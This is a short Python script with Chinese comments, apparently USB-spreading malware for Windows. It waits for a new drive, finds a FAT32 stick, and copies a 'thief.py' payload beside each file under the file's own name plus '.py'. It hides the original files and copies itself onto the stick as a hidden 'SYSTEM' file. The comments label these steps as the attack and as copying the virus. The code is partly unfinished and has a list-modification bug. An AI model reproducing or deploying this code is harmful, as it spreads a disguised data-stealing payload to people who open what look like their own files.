### DAEMON 守护进程/服务 ###
### 此程序不可在osX或GNU/Linux上启动 ###
import os
import psutil
import time
import win32con
import win32api
import shutil
import subprocess

DAEMON_PATH="D:\\vscode\\SYSTEM\\daemon.py"
THIEF_PATH="D:\\vscode\\SYSTEM\\thief.py"
DAEMON_NAME="daemon.py"
THIEF_NAME="thief.txt.py"

drive=["A:\\","B:\\","C:\\","D:\\","E:\\","F:\\","G:\\","H:\\","I:\\","J:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\","S:\\","T:\\","U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\"]
usb_drive="NULL"
def drive_sum(): #返回磁盘的个数
    time.sleep(6)
    s1=0
    for d in drive:
        if os.path.exists(d):
            s1=s1+1
    return s1

def restart(): #此函数尚未完成
    exit(0)

sum1=drive_sum()
while True:
    if drive_sum()!=sum1:
        break

#获得u盘的盘符
disks=psutil.disk_partitions()
for d in disks:
    if d.fstype=="FAT32":
        usb_drive=d.device

# 如果是一些其他原因引发的错误判断,程序自动重启
if usb_drive=="NULL": restart()

#进行攻击
if os.path.exists(usb_drive+DAEMON_NAME): restart()
target_files=os.listdir(usb_drive)
target_files.remove("System Volume Information")
for f in target_files:
    if not("." in f): target_files.remove(f) #排除目标中的文件夹,因为复制对文件夹无效
for f in target_files:
    target=usb_drive+f
    #拷贝病毒
    shutil.copyfile(THIEF_PATH, target+".py") 
    #隐藏u盘中的文件
    win32api.SetFileAttributes(target, win32con.FILE_ATTRIBUTE_HIDDEN) 
shutil.copyfile(DAEMON_PATH, usb_drive+"SYSTEM")
win32api.SetFileAttributes(usb_drive+"SYSTEM", win32con.FILE_ATTRIBUTE_HIDDEN) 
